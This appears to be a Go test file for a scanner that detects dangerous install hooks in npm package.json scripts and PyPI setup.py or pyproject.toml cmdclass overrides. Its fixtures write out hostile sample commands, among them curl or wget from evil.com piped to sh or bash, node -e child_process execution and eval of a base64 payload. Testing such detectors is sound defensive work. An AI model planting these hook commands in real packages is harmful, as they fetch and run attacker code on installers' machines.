package providers

import (
	"os"
	"path/filepath"
	"testing"
)

// ── helpers ───────────────────────────────────────────────────────────────────

func newHookAnalyzer(t *testing.T) HookAnalyzer {
	t.Helper()
	return NewHookAnalyzer()
}

// writePackageJSON creates a package.json in dir with the given scripts map.
func writePackageJSON(t *testing.T, dir string, scripts map[string]string) string {
	t.Helper()
	// Build the scripts JSON fragment.
	scriptsJSON := "{"
	first := true
	for k, v := range scripts {
		if !first {
			scriptsJSON += ","
		}
		// Simple quoting — test values must not contain backslash or double-quote.
		scriptsJSON += `"` + k + `":"` + v + `"`
		first = false
	}
	scriptsJSON += "}"

	content := `{"name":"test-pkg","version":"1.0.0","scripts":` + scriptsJSON + `}`
	path := filepath.Join(dir, "package.json")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}
	return path
}

// writePackageJSONRaw writes raw content directly to package.json.
func writePackageJSONRaw(t *testing.T, dir, content string) string {
	t.Helper()
	path := filepath.Join(dir, "package.json")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}
	return path
}

func findHookFinding(findings []Finding, rule string) *Finding {
	for i := range findings {
		if findings[i].Rule == rule {
			return &findings[i]
		}
	}
	return nil
}

func requireHookFinding(t *testing.T, findings []Finding, rule string) Finding {
	t.Helper()
	f := findHookFinding(findings, rule)
	if f == nil {
		rules := make([]string, len(findings))
		for i, x := range findings {
			rules[i] = x.Rule
		}
		t.Fatalf("expected hook finding with rule %q, got none (present: %v)", rule, rules)
	}
	return *f
}

func requireNoHookFinding(t *testing.T, findings []Finding, rule string) {
	t.Helper()
	if f := findHookFinding(findings, rule); f != nil {
		t.Errorf("unexpected hook finding with rule %q: %s", rule, f.Message)
	}
}

// ── Clean scripts (no findings expected) ─────────────────────────────────────

func TestHookAnalyzer_CleanScript_Tsc(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "tsc",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for clean 'tsc' script, got %d: %v", len(findings), findings)
	}
}

func TestHookAnalyzer_CleanScript_Echo(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "echo done",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for clean 'echo done' script, got %d: %v", len(findings), findings)
	}
}

func TestHookAnalyzer_NoScriptsField(t *testing.T) {
	dir := t.TempDir()
	writePackageJSONRaw(t, dir, `{"name":"no-scripts","version":"1.0.0"}`)

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for package with no scripts, got %d", len(findings))
	}
}

func TestHookAnalyzer_NonInstallScript_Ignored(t *testing.T) {
	// "build" is not a lifecycle hook — should not be analyzed.
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"build": "curl https://evil.com/payload | sh",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	// The build script is not an install hook so no findings.
	if len(findings) != 0 {
		t.Errorf("expected no findings for non-install hook, got %d: %v", len(findings), findings)
	}
}

// ── CRITICAL: curl/wget piped to shell ───────────────────────────────────────

func TestHookAnalyzer_CurlPipedToSh_Postinstall(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "curl https://evil.com/install.sh | sh",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-pipe-to-shell")
	if f.Severity != SeverityCritical {
		t.Errorf("expected CRITICAL severity, got %v", f.Severity)
	}
}

func TestHookAnalyzer_WgetPipedToBash_Preinstall(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"preinstall": "wget -qO- https://evil.com/setup.sh | bash",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	requireHookFinding(t, findings, "mcp-install-hook-pipe-to-shell")
}

// ── CRITICAL: wget/curl to external URL (high severity) ──────────────────────

func TestHookAnalyzer_WgetExternalURL(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "wget https://downloads.example.com/binary",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-outbound-download")
	if f.Severity != SeverityHigh {
		t.Errorf("expected HIGH severity for wget URL, got %v", f.Severity)
	}
}

func TestHookAnalyzer_CurlExternalURL_WithoutPipe(t *testing.T) {
	dir := t.TempDir()
	writePackageJSON(t, dir, map[string]string{
		"install": "curl https://example.com/config.json -o config.json",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	requireHookFinding(t, findings, "mcp-install-hook-outbound-download")
}

// ── CRITICAL: node -e inline execution ───────────────────────────────────────

func TestHookAnalyzer_NodeInlineExec(t *testing.T) {
	dir := t.TempDir()
	// Use raw JSON to embed double-quotes safely inside the script string.
	writePackageJSONRaw(t, dir, `{"name":"t","version":"1.0.0","scripts":{"postinstall":"node -e \"require('child_process').exec('id')\""}}`+"\n")

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-node-inline")
	if f.Severity != SeverityCritical {
		t.Errorf("expected CRITICAL severity for node -e, got %v", f.Severity)
	}
}

// ── CRITICAL: referenced file with exec() ────────────────────────────────────

func TestHookAnalyzer_ReferencedFile_WithChildProcessExec(t *testing.T) {
	dir := t.TempDir()

	// Use child_process.exec() with the full dotted form so the pattern
	// `child_process\.(exec|execSync)\s*\(` matches.
	scriptContent := `
const child_process = require('child_process');
child_process.exec('id', function(err, stdout) { console.log(stdout); });
`
	scriptPath := filepath.Join(dir, "scripts", "setup.js")
	if err := os.MkdirAll(filepath.Dir(scriptPath), 0755); err != nil {
		t.Fatalf("mkdir scripts/: %v", err)
	}
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
		t.Fatalf("write setup.js: %v", err)
	}

	writePackageJSON(t, dir, map[string]string{
		"postinstall": "node scripts/setup.js",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	// Should find child_process.exec in the referenced file.
	f := requireHookFinding(t, findings, "mcp-install-hook-child-process-exec")
	if f.File != scriptPath {
		t.Errorf("expected finding in referenced file %q, got %q", scriptPath, f.File)
	}
	if f.Line == 0 {
		t.Error("expected line number to be set for referenced file finding")
	}
}

// ── CRITICAL: eval() ─────────────────────────────────────────────────────────

func TestHookAnalyzer_EvalInInstallScript(t *testing.T) {
	dir := t.TempDir()
	// Use a referenced JS file that calls eval() directly so we test both
	// the node-inline pattern (quoted arg) and the eval() pattern in files.
	scriptContent := "eval(Buffer.from(process.env.PAYLOAD,'base64').toString())\n"
	scriptPath := filepath.Join(dir, "run.js")
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
		t.Fatalf("write run.js: %v", err)
	}

	writePackageJSON(t, dir, map[string]string{
		"postinstall": "node run.js",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	// eval() in referenced file triggers mcp-install-hook-eval
	requireHookFinding(t, findings, "mcp-install-hook-eval")
}

// ── WARNING: network call in install script ───────────────────────────────────

func TestHookAnalyzer_FetchCallInScript(t *testing.T) {
	dir := t.TempDir()

	scriptContent := `
const result = await fetch('https://api.example.com/check');
`
	scriptPath := filepath.Join(dir, "postinstall.js")
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
		t.Fatalf("write postinstall.js: %v", err)
	}

	writePackageJSON(t, dir, map[string]string{
		"postinstall": "node postinstall.js",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	requireHookFinding(t, findings, "mcp-install-hook-network-call")
}

// ── Malformed JSON ────────────────────────────────────────────────────────────

func TestHookAnalyzer_MalformedJSON(t *testing.T) {
	dir := t.TempDir()
	writePackageJSONRaw(t, dir, `{not valid json`)

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-malformed-json")
	if f.Severity != SeverityWarning {
		t.Errorf("expected WARNING severity for malformed JSON, got %v", f.Severity)
	}
}

// ── node_modules skipped ──────────────────────────────────────────────────────

func TestHookAnalyzer_NodeModules_Skipped(t *testing.T) {
	dir := t.TempDir()

	// Write a malicious package.json inside node_modules — should be skipped.
	nmDir := filepath.Join(dir, "node_modules", "evil-pkg")
	if err := os.MkdirAll(nmDir, 0755); err != nil {
		t.Fatalf("mkdir node_modules/evil-pkg: %v", err)
	}
	writePackageJSON(t, nmDir, map[string]string{
		"postinstall": "curl https://evil.com | sh",
	})

	// Write a clean root package.json.
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "tsc",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	// node_modules should be skipped — no findings from the nested evil package.
	if len(findings) != 0 {
		t.Errorf("expected no findings (node_modules skipped), got %d: %v", len(findings), findings)
	}
}

// ── Multiple package.json in subdirectories ───────────────────────────────────

func TestHookAnalyzer_MultiplePackageJSON_Subdirectories(t *testing.T) {
	dir := t.TempDir()

	// Root: clean.
	writePackageJSON(t, dir, map[string]string{
		"postinstall": "tsc",
	})

	// Sub-package: malicious.
	subDir := filepath.Join(dir, "packages", "evil")
	if err := os.MkdirAll(subDir, 0755); err != nil {
		t.Fatalf("mkdir packages/evil: %v", err)
	}
	writePackageJSON(t, subDir, map[string]string{
		"preinstall": "wget https://evil.com/payload | sh",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	// Should find exactly the pipe-to-shell from the sub-package.
	requireHookFinding(t, findings, "mcp-install-hook-pipe-to-shell")

	// File should point to the sub-package's package.json.
	subPkgJSON := filepath.Join(subDir, "package.json")
	found := false
	for _, f := range findings {
		if f.File == subPkgJSON {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected a finding pointing to %q, but none found", subPkgJSON)
	}
}

// ── PyPI: setup.py with cmdclass override ────────────────────────────────────

func TestHookAnalyzer_SetupPy_CmdclassOverride(t *testing.T) {
	dir := t.TempDir()

	content := `
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        import subprocess
        subprocess.call(['curl', 'https://evil.com', '|', 'sh'])
        install.run(self)

setup(
    name='evil-pkg',
    cmdclass={'install': CustomInstall},
)
`
	path := filepath.Join(dir, "setup.py")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write setup.py: %v", err)
	}

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-pypi-cmdclass")
	if f.Severity != SeverityHigh {
		t.Errorf("expected HIGH severity for PyPI cmdclass, got %v", f.Severity)
	}
	if f.File != path {
		t.Errorf("expected finding in setup.py %q, got %q", path, f.File)
	}
}

// ── PyPI: pyproject.toml with cmdclass override ───────────────────────────────

func TestHookAnalyzer_PyprojectToml_CmdclassOverride(t *testing.T) {
	dir := t.TempDir()

	content := `
[build-system]
requires = ["setuptools"]

[tool.setuptools.cmdclass]
install = "mypackage.install:CustomInstall"
`
	path := filepath.Join(dir, "pyproject.toml")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("write pyproject.toml: %v", err)
	}

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-pypi-cmdclass")
	if f.Severity != SeverityHigh {
		t.Errorf("expected HIGH severity for pyproject.toml cmdclass, got %v", f.Severity)
	}
	if f.Line == 0 {
		t.Error("expected line number in pyproject.toml finding")
	}
}

// ── WARNING: environment variable access in install script ────────────────────

func TestHookAnalyzer_EnvAccess_Warning(t *testing.T) {
	dir := t.TempDir()

	scriptContent := "process.env.SECRET_TOKEN\n"
	scriptPath := filepath.Join(dir, "setup.js")
	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
		t.Fatalf("write setup.js: %v", err)
	}

	writePackageJSON(t, dir, map[string]string{
		"postinstall": "node setup.js",
	})

	analyzer := newHookAnalyzer(t)
	findings := analyzer.AnalyzeDirectory(dir)

	f := requireHookFinding(t, findings, "mcp-install-hook-env-access")
	if f.Severity != SeverityWarning {
		t.Errorf("expected WARNING severity for env access, got %v", f.Severity)
	}
}

// ── Severity ordering check ───────────────────────────────────────────────────

func TestHookAnalyzer_AllHookNames(t *testing.T) {
	// Verify all four hook names are analyzed (preinstall, install, postinstall, prepare).
	tests := []struct {
		hook    string
		script  string
		expRule string
	}{
		{"preinstall", "curl https://evil.com/x | sh", "mcp-install-hook-pipe-to-shell"},
		{"install", "curl https://evil.com/x | sh", "mcp-install-hook-pipe-to-shell"},
		{"postinstall", "curl https://evil.com/x | sh", "mcp-install-hook-pipe-to-shell"},
		{"prepare", "curl https://evil.com/x | sh", "mcp-install-hook-pipe-to-shell"},
	}

	for _, tt := range tests {
		t.Run(tt.hook, func(t *testing.T) {
			dir := t.TempDir()
			writePackageJSON(t, dir, map[string]string{tt.hook: tt.script})
			analyzer := newHookAnalyzer(t)
			findings := analyzer.AnalyzeDirectory(dir)
			requireHookFinding(t, findings, tt.expRule)
		})
	}
}

// ── Interface guard ───────────────────────────────────────────────────────────

func TestHookAnalyzerInterfaceGuard(t *testing.T) {
	var _ HookAnalyzer = (*hookAnalyzer)(nil)
}
